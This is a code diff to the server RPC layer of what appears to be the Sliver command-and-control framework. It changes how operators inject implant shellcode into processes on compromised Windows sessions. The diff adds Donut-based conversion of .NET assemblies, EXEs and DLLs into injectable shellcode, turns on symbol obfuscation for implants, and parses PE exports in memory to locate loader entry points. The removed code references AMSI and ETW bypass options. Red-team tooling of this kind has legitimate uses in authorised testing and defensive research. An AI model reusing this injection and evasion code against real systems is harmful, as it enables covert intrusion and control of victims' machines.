@@ -21,7 +21,6 @@ package rpc
 import (
 	"bytes"
 	"context"
-	"debug/pe"
 	"encoding/binary"
 	"fmt"
 	"io/ioutil"
@@ -30,10 +29,12 @@ import (
 	"path"
 	"strings"
 
+	"github.com/Binject/debug/pe"
+	"github.com/binject/go-donut/donut"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/server/assets"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/generate"
 
 	"github.com/golang/protobuf/proto"
@@ -56,13 +57,19 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
-	shellcode, err := getSliverShellcode(req.Config.GetName())
+	name := path.Base(req.Config.GetName())
+	shellcode, err := getSliverShellcode(name)
 	if err != nil {
-		config := generate.ImplantConfigFromProtobuf(req.Config)
-		config.Name = ""
+		name, config := generate.ImplantConfigFromProtobuf(req.Config)
+		if name == "" {
+			name, err = generate.GetCodename()
+			if err != nil {
+				return nil, err
+			}
+		}
 		config.Format = clientpb.ImplantConfig_SHELLCODE
-		config.ObfuscateSymbols = false
-		shellcodePath, err := generate.SliverShellcode(config)
+		config.ObfuscateSymbols = true
+		shellcodePath, err := generate.SliverShellcode(name, config)
 		if err != nil {
 			return nil, err
 		}
@@ -95,34 +102,29 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
+	shellcode, err := generate.DonutFromAssembly(
+		req.Assembly,
+		req.IsDLL,
+		req.Arch,
+		req.Arguments,
+		req.Method,
+		req.ClassName,
+		req.AppDomain,
+	)
+	if err != nil {
+		return nil, err
+	}
 
-	// We have to add the hosting DLL to the request before forwarding it to the implant
-	hostingDllPath := path.Join(assets.GetDataDir(), "HostingCLRx64.dll")
-	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
-	if err != nil {
-		return nil, err
-	}
-	offset, err := getExportOffset(hostingDllPath, "ReflectiveLoader")
-	if err != nil {
-		return nil, err
-	}
-	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
-		Request:    req.Request,
-		Assembly:   req.Assembly,
-		HostingDll: hostingDllBytes,
-		Arguments:  req.Arguments,
-		Process:    req.Process,
-		AmsiBypass: req.AmsiBypass,
-		EtwBypass:  req.EtwBypass,
-		Offset:     offset,
+	reqData, err := proto.Marshal(&sliverpb.InvokeExecuteAssemblyReq{
+		Data:    shellcode,
+		Process: req.Process,
 	})
 	if err != nil {
 		return nil, err
 	}
-
 	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
 	timeout := rpc.getTimeout(req)
-	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
+	respData, err := session.Request(sliverpb.MsgInvokeExecuteAssemblyReq, timeout, reqData)
 	if err != nil {
 		return nil, err
 	}
@@ -132,6 +134,7 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 		return nil, err
 	}
 	return resp, nil
+
 }
 
 // Sideload - Sideload a DLL on the remote system (Windows only)
@@ -154,6 +157,7 @@ func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sl
 			Request:     req.Request,
 			Data:        shellcode,
 			ProcessName: req.ProcessName,
+			Kill:        req.Kill,
 		})
 		if err != nil {
 			return nil, err
@@ -183,36 +187,75 @@ func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sl
 }
 
 // SpawnDll - Spawn a DLL on the remote system (Windows only)
-func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.SpawnDllReq) (*sliverpb.SpawnDll, error) {
+func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq) (*sliverpb.SpawnDll, error) {
+	session := core.Sessions.Get(req.Request.SessionID)
+	if session == nil {
+		return nil, ErrInvalidSessionID
+	}
+
 	resp := &sliverpb.SpawnDll{}
-	err := rpc.GenericHandler(req, resp)
+	offset, err := getExportOffsetFromMemory(req.Data, req.EntryPoint)
 	if err != nil {
 		return nil, err
 	}
-	return resp, nil
+	timeout := rpc.getTimeout(req)
+	data, err := proto.Marshal(&sliverpb.SpawnDllReq{
+		Data:        req.Data,
+		Offset:      offset,
+		ProcessName: req.ProcessName,
+		Args:        req.Args,
+		Request:     req.Request,
+		Kill:        req.Kill,
+	})
+	if err != nil {
+		return nil, err
+	}
+	respData, err := session.Request(sliverpb.MsgSpawnDllReq, timeout, data)
+	err = proto.Unmarshal(respData, resp)
+	return resp, err
 }
 
 // Utility functions
 func getSliverShellcode(name string) ([]byte, error) {
 	var data []byte
-	// get implants builds
-	configs, err := generate.ImplantConfigMap()
+	build, err := db.ImplantBuildByName(name)
 	if err != nil {
-		return data, err
+		return nil, err
 	}
-	// get the implant with the same name
-	if conf, ok := configs[name]; ok {
-		if conf.Format == clientpb.ImplantConfig_SHELLCODE {
-			fileData, err := generate.ImplantFileByName(name)
-			if err != nil {
-				return data, err
-			}
-			data = fileData
-		} else {
-			err = fmt.Errorf("no existing shellcode found")
+
+	switch build.ImplantConfig.Format {
+	case clientpb.ImplantConfig_SHELLCODE:
+		fileData, err := generate.ImplantFileFromBuild(build)
+		if err != nil {
+			return data, err
 		}
-	} else {
-		err = fmt.Errorf("no sliver found with this name")
+		data = fileData
+	case clientpb.ImplantConfig_EXECUTABLE:
+		// retrieve EXE from db
+		fileData, err := generate.ImplantFileFromBuild(build)
+		rpcLog.Debugf("Found implant. Len: %d\n", len(fileData))
+		if err != nil {
+			return data, err
+		}
+		data, err = generate.DonutShellcodeFromPE(fileData, build.ImplantConfig.GOARCH, false, "", "", "", donut.DONUT_MODULE_EXE)
+		if err != nil {
+			rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
+			return data, err
+		}
+	case clientpb.ImplantConfig_SHARED_LIB:
+		// retrieve DLL from db
+		fileData, err := generate.ImplantFileFromBuild(build)
+		if err != nil {
+			return data, err
+		}
+		data, err = generate.ShellcodeRDIFromBytes(fileData, "RunSliver", "")
+		if err != nil {
+			return data, err
+		}
+	case clientpb.ImplantConfig_SERVICE:
+		fallthrough
+	default:
+		err = fmt.Errorf("no existing shellcode found")
 	}
 	return data, err
 }
@@ -262,7 +305,7 @@ func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32)
 	return funcOffset
 }
 
-func getExportOffset(filepath string, exportName string) (funcOffset uint32, err error) {
+func getExportOffsetFromFile(filepath string, exportName string) (funcOffset uint32, err error) {
 	rawData, err := ioutil.ReadFile(filepath)
 	if err != nil {
 		return 0, err
@@ -273,6 +316,40 @@ func getExportOffset(filepath string, exportName string) (funcOffset uint32, err
 	}
 	defer handle.Close()
 	fpe, _ := pe.NewFile(handle)
+	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+	var offset = rvaToFoa(exportDirectoryRVA, fpe)
+	exportDir := ExportDirectory{}
+	buff := &bytes.Buffer{}
+	buff.Write(rawData[offset:])
+	err = binary.Read(buff, binary.LittleEndian, &exportDir)
+	if err != nil {
+		return 0, err
+	}
+	current := exportDir.AddressOfNames
+	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
+	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
+	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)
+
+	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
+		index := nameArrayFOA + i*8
+		name := getFuncName(index, rawData, fpe)
+		if strings.Contains(name, exportName) {
+			ordIndex := ordinalArrayFOA + i*2
+			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
+		}
+		current += uint32(binary.Size(i))
+	}
+
+	return
+}
+
+func getExportOffsetFromMemory(rawData []byte, exportName string) (funcOffset uint32, err error) {
+	peReader := bytes.NewReader(rawData)
+	fpe, err := pe.NewFile(peReader)
+	if err != nil {
+		return 0, err
+	}
+
 	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
 	var offset = rvaToFoa(exportDirectoryRVA, fpe)
 	exportDir := ExportDirectory{}
